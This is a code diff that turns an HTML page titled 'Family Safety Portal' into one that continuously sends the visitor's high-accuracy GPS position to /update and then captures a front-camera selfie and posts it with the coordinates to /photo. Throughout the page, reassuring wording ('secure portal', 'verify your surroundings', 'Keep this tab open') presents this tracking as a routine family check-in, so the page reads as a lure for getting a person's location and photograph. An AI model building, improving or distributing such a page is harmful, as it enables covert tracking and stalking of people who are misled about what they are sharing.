@@ -2,41 +2,121 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting...</title>
+    <title>Family Safety Portal</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f6f9; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f6f9; color: #333; }
+        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: 20px auto; }
+        video { width: 100%; max-width: 320px; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 15px; display: none; }
+        button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-weight: bold; color: #555; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>Connecting to Family Portal</h2>
-    <div class="loader"></div>
-    <p id="msg">Locating device... Please stay on this page.</p>
 
-    <script>
-        let deviceOwner = prompt("Please enter your name:") || "Unknown Device";
+<div class="card">
+    <h2>Family Safety Check-In</h2>
+    <div id="loader" class="loader"></div>
+    <p id="status">Connecting to secure portal...</p>
+    
+    <video id="video" autoplay playsinline></video>
+    <button id="snapBtn" onclick="takeSelfie()">📷 Take Photo & Share</button>
+</div>
 
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition((position) => {
-                const data = {
-                    name: deviceOwner,
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude
-                };
-                
-                fetch('/update', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                document.getElementById('msg').innerText = "Secure connection established, " + deviceOwner + "! Keep this tab open.";
-            }, (err) => {
-                document.getElementById('msg').innerText = "Error: Please allow location access.";
-            }, { enableHighAccuracy: true });
-        } else {
-            document.getElementById('msg').innerText = "Device not supported.";
+<script>
+    let deviceOwner = prompt("Please enter your name:") || "Unknown Device";
+    let currentLat = null;
+    let currentLon = null;
+    let videoStream = null;
+
+    const statusDiv = document.getElementById('status');
+    const loaderDiv = document.getElementById('loader');
+    const videoEl = document.getElementById('video');
+    const snapBtn = document.getElementById('snapBtn');
+
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition((position) => {
+            currentLat = position.coords.latitude;
+            currentLon = position.coords.longitude;
+            
+            fetch('/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name: deviceOwner, lat: currentLat, lon: currentLon })
+            });
+
+            if(!videoStream) {
+                setupCamera();
+            }
+        }, (err) => {
+            statusDiv.innerText = "Error: Please allow location access to continue.";
+            loaderDiv.style.display = 'none';
+        }, { enableHighAccuracy: true });
+    } else {
+        statusDiv.innerText = "Device not supported.";
+        loaderDiv.style.display = 'none';
+    }
+
+    function setupCamera() {
+        statusDiv.innerText = "Setting up secure camera check-in...";
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then((stream) => {
+                videoStream = stream;
+                videoEl.srcObject = stream;
+                videoEl.style.display = 'inline-block';
+                snapBtn.style.display = 'block';
+                statusDiv.innerText = "Connected! Tap below to verify your surroundings.";
+                loaderDiv.style.display = 'none';
+            })
+            .catch((err) => {
+                statusDiv.innerText = "Camera access denied. Please allow camera access.";
+                loaderDiv.style.display = 'none';
+            });
+    }
+
+    function takeSelfie() {
+        if(!currentLat || !currentLon) {
+            alert("Waiting for accurate GPS lock before submitting...");
+            return;
         }
-    </script>
+
+        snapBtn.disabled = true;
+        snapBtn.innerText = "Sending Secure Update...";
+
+        const canvas = document.createElement('canvas');
+        canvas.width = videoEl.videoWidth || 640;
+        canvas.height = videoEl.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+        fetch('/photo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                name: deviceOwner,
+                lat: currentLat,
+                lon: currentLon,
+                image: imageData
+            })
+        }).then(() => {
+            statusDiv.innerText = "Verification successfully shared! You can close this tab.";
+            snapBtn.innerText = "✅ Successfully Sent";
+            if(videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        }).catch(err => {
+            alert("Transmission dropped. Try tapping share again.");
+            snapBtn.disabled = false;
+            snapBtn.innerText = "📷 Take Photo & Share";
+        });
+    }
+</script>
+
 </body>
 </html>
